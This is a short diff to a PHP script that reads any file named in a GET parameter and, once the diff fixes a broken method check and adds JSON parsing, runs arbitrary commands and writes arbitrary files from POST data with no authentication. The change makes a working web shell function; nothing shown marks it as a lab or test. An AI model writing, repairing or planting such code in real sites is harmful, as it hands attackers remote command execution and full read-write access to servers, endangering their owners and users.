@@ -9,11 +9,12 @@ if ($_SERVER["REQUEST_METHOD"] === "GET") {
     if (isset($_GET["getfile"])) {
         echo file_get_contents($_GET["getfile"]);
     }
-} else if ($_SERVER["REQUEST_METHOD"] === "POST ") {
-    if (isset($_POST["command"])) {
-        executeCommand($_POST["command"]);
-    } else if (isset($_POST["savefile"]) && isset($_POST["savefiledata"])) {
-        file_put_contents($_POST["savefile"], $_POST["savefiledata"]);
+} else if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $data = json_decode(file_get_contents('php://input'), true);
+    if (isset($data["command"])) {
+        executeCommand($data["command"]);
+    } else if (isset($data["savefile"]) && isset($data["savefiledata"])) {
+        file_put_contents($data["savefile"], $data["savefiledata"]);
     }
 }
 
